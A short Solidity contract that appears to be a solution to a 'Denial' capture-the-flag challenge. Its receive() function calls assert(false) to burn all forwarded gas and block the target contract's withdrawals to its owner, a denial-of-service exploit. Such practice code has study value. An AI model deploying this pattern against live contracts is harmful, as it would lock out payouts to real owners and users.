// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

/// @title Denial challenge attacker contract 
/// @notice This contract is perfoming a DOS (Denial of Service) attack on Denial contract. 
/// as the .call to our contract will revert the transaction and prevent owner from receive funds
/// assert will not return any gas to the caller and make tx fail. 

contract DenialAttack {


    receive() external payable{
        assert(false);
    }
}